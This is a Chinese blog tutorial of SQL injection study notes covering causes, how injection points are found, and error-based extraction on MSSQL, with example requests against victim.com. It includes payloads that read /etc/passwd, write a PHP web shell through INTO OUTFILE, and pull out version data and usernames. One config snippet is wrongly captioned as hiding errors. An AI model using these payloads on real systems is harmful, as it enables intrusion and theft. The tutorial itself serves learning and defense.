<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SQL注入学习, 逐梦">
    <meta name="description" content="本文从《SQL注入攻击与防御》总结">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>SQL注入学习 | 逐梦</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    
    <style>
        body{
            background-image: url(/medias/banner/5.jpg);
            background-repeat:no-repeat;
            background-size: 100% 100%;
            background-attachment:fixed;
        }
    </style>



    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 5.4.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="逐梦" type="application/atom+xml">
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">逐梦</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">逐梦</div>
        <div class="logo-desc">
            
            Welcome to my blog
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/0xdadream/0xdadream.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/0xdadream/0xdadream.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/images/5.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SQL注入学习</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/sql/">
                                <span class="chip bg-color">sql</span>
                            </a>
                        
                            <a href="/tags/%E5%AD%A6%E4%B9%A0/">
                                <span class="chip bg-color">学习</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/web/" class="post-category">
                                web
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-07-19
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-07-27
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    62.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    264 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="数据库与web交互"><a href="#数据库与web交互" class="headerlink" title="数据库与web交互"></a>数据库与web交互</h3><p>数据库驱动的Web应用通常包含三层：表示层、逻辑层和存储层</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/bd917bb464f4ecc0a70931647924489c.png"></p>
<p>Web浏览器（表示层）向中间层（逻辑层）发送请求，后者依次调用由位于应用层 的应用服务器提供的API，应用层通过查询、更新数据库（存储层）来响应该请求。</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/fb4fe488ca6064bb837f649984e43f12.png"></p>
<h3 id="SQL注入的产生过程"><a href="#SQL注入的产生过程" class="headerlink" title="SQL注入的产生过程"></a><strong>SQL</strong>注入的产生过程</h3><h4 id="构造动态字符串"><a href="#构造动态字符串" class="headerlink" title="构造动态字符串"></a>构造动态字符串</h4><p>简单来说就是将得到参数拼接到查询语句，然后执行，下列不当将会导致SQL注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">TABLE</span> <span class="token keyword">WHERE</span> FIELD <span class="token operator">=</span> <span class="token string">'input'</span>

input 在不同语言运行的服务器上写法不同
PHP
$query <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field ='$_GET["</span>input<span class="token string">"]'"</span>
<span class="token punctuation">.</span>NET
query <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = ' "</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ' "</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>转义字符处理不当</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">SQL</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '$_GET["</span>input<span class="token string">"]'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SQL数据库将单引号字符<code>'</code>解析成代码与数据间的分界线，单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> field <span class="token operator">=</span> <span class="token string">''</span>
报错
You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>' at line <span class="token number">1</span>
这是一种报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>出现该错误是因为单引号字符被解析成了字符串分隔符。运行时执行的SQL查询在语法上存在错误(它包含多个字符串分隔符)，所以数据库抛出异常。SQL数据库将单引号字符看作特殊字符(字符串分隔符)。</p>
<p>当然还有其他的转义字符，比如oracle中，空格<code> </code> 双斜线<code>|| </code>逗号<code>,</code> 点号<code>.</code> <code>*/</code>以及双引号<code>"</code> 这里不详细讲解。</p>
<p><code>||</code>将前后的执行结果连接</p>
<p><code>*/</code> 结束注释</p>
</li>
<li><p>类型处理不当</p>
<p>接受的参数类型不一定是字符串，也可能是数字型，这里一味地过滤单引号也就没多大用处。</p>
<p>数字型<code>or 1=1</code>大概判断，一旦存在并有FILE权限，就能使用下面代码注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token comment">--</span>
<span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token string">"&lt;? system($_REQUEST['cmd']); ?&gt;"</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">"/var/www/html/victim.com/cmd.php"</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>查询语句组装不当</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$SQL</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"columnl"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">","</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"column2"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">","</span><span class="token operator">.</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"column3"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">"FROM"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"table"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这种随便改个包发送，数据库基本上就没了，因为所有参数可改</p>
</li>
<li><p>错误处理不当</p>
<p>就如第一个报错，报错信息完全不必展示给用户看，不展示，自然会阻断部分攻击者。</p>
</li>
<li><p>多个提交处理不当</p>
<p>这里有点条件竞争的意思</p>
<p>第一个提交需要验证码，第二个却没设置，正常用户可能会从第一个提交进入，攻击者就会用第二个提交FUZZ，这就和某些应用分享一样，不验证是否成功，虚晃一招。</p>
</li>
</ul>
<h4 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h4><p>默认的数据库系统管理员账号，预置的系统库，表，很多的默认配置都是不安全的，试想一下，知道你的管理员账号，爆破密码会降低多少数量级的难度</p>
<p>降低权限是一个好习惯</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Oracle语句，列举当前用户可访问的所有表</span>
<span class="token keyword">SELECT</span> OWNER<span class="token punctuation">,</span> TABLE_NAME <span class="token keyword">FROM</span> ALL_TABLES <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> TABLE_NAME<span class="token punctuation">;</span> 
<span class="token comment">--MySQL语句，列举当前用户可访问的所有表和数据库</span>
<span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span>
<span class="token comment">--MSSQL语句，使用系统表列举所有可访问的表</span>
<span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sysobjects <span class="token keyword">WHERE</span> xtype <span class="token operator">=</span> <span class="token string">'U'</span><span class="token punctuation">;</span>
<span class="token comment">--MSSQL语句，使用目录视图列举所有可访问的表</span>
<span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h2><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><h4 id="借助推理进行测试"><a href="#借助推理进行测试" class="headerlink" title="借助推理进行测试"></a>借助推理进行测试</h4><h5 id="识别数据输入"><a href="#识别数据输入" class="headerlink" title="识别数据输入"></a>识别数据输入</h5><p>GET请求、POST请求、HTTP其他与数据库有交互的都可能存在注入，比如COOKIE注入。</p>
<h5 id="操纵参数"><a href="#操纵参数" class="headerlink" title="操纵参数"></a>操纵参数</h5><p><code>http://sql.com/index.php?id=1</code></p>
<p>这个<code>1</code>就是参数，这个参数是可以控制的，可以用来测试，比如<code>'</code></p>
<p>先将<code>id</code>改为一个不常见的参数，报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: mysql_fetch_assoc <span class="token punctuation">(</span><span class="token punctuation">)</span> : supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid MySQL result resource <span class="token operator">in</span> XXXX <span class="token keyword">on</span> line <span class="token number">34</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>加一个单引号<code>http://sql.com/index.php?id=1'</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>还有一些其他的测试方法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">在Oracle和PostgreSQL中的漏洞。向Web服务器发送下面两个请求：
http:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>
http:<span class="token comment">//www.victim.com/showproducts.php?category=bi'||'kes</span>
在Microsoft <span class="token keyword">SQL</span> Server中与之等价的请求为：
http:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>
http:<span class="token comment">//www.victim.com/showproducts.php?category=bi'+'kes</span>
在MySQL中与之等价的请求为（请注意两个单引号之间的空格）：
http:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>
http:<span class="token comment">//www.victim.com/showproducts.php?category=bi''kes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="信息工作流"><a href="#信息工作流" class="headerlink" title="信息工作流"></a>信息工作流</h5><p><img src="https://images.dadream.eu.org/images/2024/07/264b07c0f1804dc008b15f081b391718.png"></p>
<h4 id="数据库错误"><a href="#数据库错误" class="headerlink" title="数据库错误"></a>数据库错误</h4><p>就是上文提到的报错</p>
<h5 id="常见的sql漏洞"><a href="#常见的sql漏洞" class="headerlink" title="常见的sql漏洞"></a>常见的sql漏洞</h5><h6 id="Sql-Server错误"><a href="#Sql-Server错误" class="headerlink" title="Sql Server错误"></a>Sql Server错误</h6><p>假设在victim.com应用中找到了一个名为showproducts.php的页面，页面脚本接收名为id 的参数并根据id参数的值显示单个商品：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.aspx?id=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果将id参数的值修改成下列内容：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.aspx?id=attacker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>应用会返回类似于下列内容的错误：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Server Error <span class="token operator">in</span> <span class="token string">'/'' Application.
Invalid column name '</span>attacker<span class="token string">'.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Invalid column name '</span>attacker'<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在这个错误的基础上，可以猜想第一个示例中应用创建的SQL语句应如下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上述语句返回的结果集是idproduct字段等于2时的商品。如果注入一个非数字值，比如 attacker,那么最终发送给数据库服务器的SQL语句将如下所示：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span>attacker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>这里mssql认为attacker不是一个数字，那么他就是个列名</strong></p>
<p>然后服务器从数据库中查找attacker列，没找到就返回了<code>Invalid column name 'attacker'.</code></p>
<p>这里的attacker就可以做文章</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' and l=0/@@ version;--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>传入参数<code>' and 1=0/@@version;--</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Syntax error converting the nvarchar <span class="token keyword">value</span> <span class="token string">'Microsoft SQL Server 2000 - 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988 - 2003 Microsoft Corporation Enterprise Edition on Windows NT 5.2 (Build 3790:)'</span> <span class="token keyword">to</span> a <span class="token keyword">column</span> <span class="token keyword">of</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以看到这里的报错和上面是一个格式，错误信息展示了<code>@@version</code>查询的内容</p>
<p>原理：mssql的类型转换功能，<code>0/@@version</code>除法运算，sql将这两个操作数都作为操作数，将<code>@@version</code>当做数字解析，操作失败，将返回了这个错误。换成其他参数也是一个原理。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">还有一些技术可用于显示数据库执行的语句的信息，比如使用<span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>：
http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' having '1' ='1</span>
应用响应如下：
Server Error <span class="token operator">in</span> <span class="token string">'/'</span> Application<span class="token punctuation">.</span>
<span class="token keyword">Column</span> <span class="token string">'products.productid'</span> <span class="token operator">is</span> invalid <span class="token operator">in</span> the <span class="token keyword">select</span> list because it <span class="token operator">is</span> <span class="token operator">not</span> contained <span class="token operator">in</span> an aggregate <span class="token keyword">function</span> <span class="token operator">and</span> there <span class="token operator">is</span> <span class="token keyword">no</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> clause<span class="token punctuation">.</span>
Description: An unhandled exception occurred during the execution <span class="token keyword">of</span> the <span class="token keyword">current</span> web request<span class="token punctuation">.</span> Please review the stack trace <span class="token keyword">for</span> more information about the error <span class="token operator">and</span> <span class="token keyword">where</span> it originated <span class="token operator">in</span> the code<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>having字句和group by 字句结合使用，在select中使用having过滤group by ，group by要求select语句选择的字段是某个聚合函数的结果，或者包含在group by 字句中，如果不满足，那么数据库返回一个错误，显示错误的第一列，该技术可以用来枚举表的列。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' group by productid having '1' ='1</span>
<span class="token comment">#products.name</span>

http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' group by productid,name having '1' ='1</span>
<span class="token comment">#products.price</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后用上面提到类型转换错误检索列对应的值</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' and 1=0/name;--</span>

Server Error <span class="token operator">in</span> <span class="token string">'/'</span> Application<span class="token punctuation">.</span>
Syntax error converting the nvarchar <span class="token keyword">value</span> <span class="token string">'Claud Butler Olympus D2'</span> <span class="token keyword">to</span> a <span class="token keyword">column</span> <span class="token keyword">of</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span>
Description: An unhandled exception occurred during the execution <span class="token keyword">of</span> the <span class="token keyword">current</span> web request<span class="token punctuation">.</span> Please review the stack trace <span class="token keyword">for</span> more information about the error <span class="token operator">and</span> <span class="token keyword">where</span> it originated <span class="token operator">in</span> the code<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在身份验证机制中，可能枚举到用户名和密码的列，这样便可能登录有管理员权限的账号。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/logon.aspx?username=test' and User not in ('Admin') and l=0/User and '1' ='1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个payload将Admin用户排除，查找其他用户</p>
<p>关闭ASP.NET中服务器向远程访问者显示详细错误信息</p>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">web.config
&lt;configuration&gt;
&lt;system.web&gt;
&lt;customErrors mode="Off"/&gt;
&lt;/system.web&gt;
&lt;/configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>设置错误重定向</p>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;configuration&gt;
&lt;system.web&gt;
&lt;customErrorsdefaultRedirect="Error.aspx" mode="On"〉
&lt;errorstatusCode="403H redirect='*AccessDenied.aspxn/&gt;
&lt;errorstatusCode="404" redirect="NotFound.aspx"/&gt;
&lt;errorstatusCode="500" redirect="InternalError.aspx"/&gt;
&lt;/customErrors&gt;
&lt;/system.web&gt;
&lt;/configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="Mysql错误"><a href="#Mysql错误" class="headerlink" title="Mysql错误"></a>Mysql错误</h6><p>常见错误代码</p>
